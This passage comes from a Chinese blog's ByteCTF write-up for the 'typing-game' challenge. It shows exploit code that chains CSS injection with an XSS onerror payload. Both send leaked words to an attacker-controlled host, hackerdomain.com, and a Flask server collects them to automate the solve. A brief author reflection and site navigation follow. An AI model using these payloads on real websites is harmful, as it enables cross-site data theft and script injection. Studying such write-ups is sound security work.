class="string">&quot;%0a.container%20embed[src^=hello]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/hello);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=world]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/world);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=fighting]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/fighting);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=flag]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/flag);&#125;&quot;</span> + </span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=game]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/game);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=happy]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/happy);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;x&#123;&quot;</span> + </span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;&amp;name=&lt;img src=x onerror=\&quot;fetch(&#x27;https://www.hackerdomain.com/ctftest/setword/xss_done&#x27;);&quot;</span> + after_command + <span class="string">&quot;\&quot; /&gt;#&quot;</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">create_window</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> w = open(base_url)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> w</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    ended = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">get_word</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (ended) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取到当前答案</span></span></span><br><span class="line"><span class="javascript">        fetch(<span class="string">&quot;https://www.hackerdomain.com/ctftest/getword&quot;</span>).then(<span class="function"><span class="params">r</span> =&gt;</span> r.text().then(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (x == <span class="string">&quot;xss_done&quot;</span>) &#123;</span></span><br><span class="line"><span class="javascript">                ended = <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (x == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//修改href,提交答案</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.vuln_window.location.href = base_url + x;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;));</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//clear old word</span></span></span><br><span class="line"><span class="javascript">        fetch(<span class="string">&quot;https://www.hackerdomain.com/ctftest/getword&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 创建窗口，自动化解题</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.vuln_window = create_window()</span></span><br><span class="line"><span class="javascript">            <span class="built_in">setInterval</span>(get_word, <span class="number">500</span>);</span></span><br><span class="line"><span class="javascript">        &#125;, <span class="number">500</span>);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//prevent window being recycled</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">        &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">        &#125;, <span class="number">10000</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">        &#125;, <span class="number">20000</span>)</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    main()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,abort</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after_request</span>(<span class="params">response</span>):</span></span><br><span class="line">  response.headers.add(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">  response.headers.add(<span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class="string">&#x27;Content-Type,Authorization&#x27;</span>)</span><br><span class="line">  response.headers.add(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;GET,PUT,POST,DELETE,OPTIONS&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">word = <span class="literal">None</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ctftest/setword/&lt;lword&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">lword</span>):</span></span><br><span class="line">    <span class="keyword">global</span> word</span><br><span class="line">    word = lword</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;word is&quot;</span>,word)</span><br><span class="line">    abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ctftest/getword&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getword</span>():</span></span><br><span class="line">    <span class="keyword">global</span> word</span><br><span class="line">    <span class="keyword">if</span> word <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    lword = word</span><br><span class="line">    word = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> lword</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建议部署https</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">7099</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="我的总结-2">我的总结</h4>
+<p>这道题赛后分析看起来还是思路比较清楚的，但是要求的水平还是比较高的。这也是第一次复盘这么复杂的题目，整体的手段环环相扣，重点还是利用同源策略分析出要从name处实现XSS，然后再利用CSS注入实现自动化做题。</p>
+<p>还是分析的能力偏弱，同时XSS也是我的薄弱项，中间花了不少时间去学习同源策略，但是学习到了非常多。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/ByteCTF/" rel="tag"># ByteCTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/16/blog0024-NSSCTF-Crypto-wp/" rel="prev" title="NSSCTF-Crypto-wp">
+      <i class="fa fa-chevron-left"></i> NSSCTF-Crypto-wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/18/blog0026-ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-wp/" rel="next" title="ctfshow-代码审计-wp">
+      ctfshow-代码审计-wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#grafana"><span class="nav-text">grafana</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%9B%98"><span class="nav-text">解题复盘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E6%80%BB%E7%BB%93"><span class="nav-text">我的总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf-cloud"><span class="nav-text">ctf-cloud</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%9B%98-1"><span class="nav-text">解题复盘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E6%80%BB%E7%BB%93-1"><span class="nav-text">我的总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#typing-game"><span class="nav-text">typing-game</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%9B%98-2"><span class="nav-text">解题复盘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E6%80%BB%E7%BB%93-2"><span class="nav-text">我的总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">whistle.H</p>
+  <div class="site-description" itemprop="description">天青色等烟雨，而我在等你</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">whistle.H</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
